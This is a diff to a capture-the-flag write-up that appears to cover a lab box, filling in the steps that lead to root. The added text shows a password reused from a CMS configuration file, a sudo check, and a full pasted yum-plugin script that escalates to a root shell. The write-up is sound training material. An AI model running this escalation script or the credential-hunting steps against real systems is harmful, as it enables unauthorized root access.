@@ -8,7 +8,7 @@
 
 *Rating* - **Hard**
 
-*When all you want is pictures of Spider Man, but they only bring you this box.*
+![When all you want is pictures of Spider Man, and all you get is this box](https://i.imgur.com/9dVhTFv.png)
 
 
 ## **Step 1 : RECONNAISSANCE**
@@ -156,24 +156,80 @@ My command goes like this: `python -c 'import tty; pty.spawn("/bin/bash")'`
 
 ![Illustrating the previous point](https://i.imgur.com/A9nTCFY.png)
 
-### *Finding users on the machine*
+### *Getting a user shell*
 
-Next, I enumerated through the users on the machine in order to see if jonah existed. We do find his user account (`jjameson`), but his password doesn't work.
+Next, I enumerated through the users on the machine in order to see if jonah existed. We do find his user account (`jjameson`), but his website password doesn't work. No problem here, the next step will help us greatly!
 
+![Users on the machine](https://i.imgur.com/THSKs5X.png)
 
-### *Step 4.2*
+#### *Finding user jjameson's password inside the website's configuration file
 
-Lorem ipsum dolor sit amet, ex soleat dicunt consectetuer quo, qui id unum menandri, nec in minim laoreet indoctum. Mea insolens recusabo an, quo eu erant definitiones. Has nullam putant phaedrum ei. Qui ei pertinacia consequuntur reprehendunt. Ad vix homero placerat inciderint, ad quod justo luptatum sit.
+After enumerating a little, I checked the **configuration.php** file inside the `/var/www/html/` folder. We find what seems to be the "root" password. While this password did not work for the root user, it worked for jjameson!
 
-#### Substep 4.2.1
+![Finding a password inside the configuration.php](https://i.imgur.com/kcmBAlr.png)
 
-Lorem ipsum dolor sit amet, ex soleat dicunt consectetuer quo, qui id unum menandri, nec in minim laoreet indoctum. Mea insolens recusabo an, quo eu erant definitiones. Has nullam putant phaedrum ei. Qui ei pertinacia consequuntur reprehendunt. Ad vix homero placerat inciderint, ad quod justo luptatum sit.
+![Switching to the jjameson user using our newly found password](https://i.imgur.com/PXKLFDt.png)
+
+### *Getting root*
+
+Now that we have a shell as a "normal user", let's see what we can do.
+
+#### Checking sudo privileges
+
+One of the first step we should do is check our sudo privileges : `sudo -l`.
+
+In this case, we get a hit!
+
+![sudo -l results](https://i.imgur.com/8WdCVwo.png)
+
+#### Privilege escalation via the sudo'able binary "yum"
+
+Using [GTFOBins](https://gtfobins.github.io/), we find that we can [exploit a sudo'able yum](https://gtfobins.github.io/gtfobins/yum/#sudo) in order to privesc.
+
+I followed the (b) option and only changed `/bin/sh` to `/bin/bash` in order to gain a bash shell and not a simple system shell.
+
+Here is the script I used. Just write it in the terminal **exactly as is** and **line by line**.
+
+```
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/bash','/bin/bash')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+
+Once this is done, we can see we are root!
+
+![We got root!](https://i.imgur.com/KyMo90J.png)
+
+**PWNED!**
 
 
 ## **SUMMARY**
 
-> Summary of the box with main take aways
+This box was an interesting one and my hardest one to date (rating wise). My main takeaway was that obvious hints may not be hints after all (`Super User` user and the index.php login form). 
 
-# **That's it for now. Thank you for reading this write-up!**
+This challenge has also helped develop my CMS methodology, mainly by reminding me to always hunt for versions in order to have an idea of how and what to attack. I spent way too much time trying to find a way in using SQLi while all I had to do was re-read my dirbuster results, go check out the README.txt, and use a tool against this CMS' version. This comes back to the old saying which goes like this: *"Enumerate, enumerate, enumerate. Once you're done enumerating, enumerate again."*
+
+
+# **That's it for now. Thank you for reading this write-up! :)**
 
 ### **Vonshad**
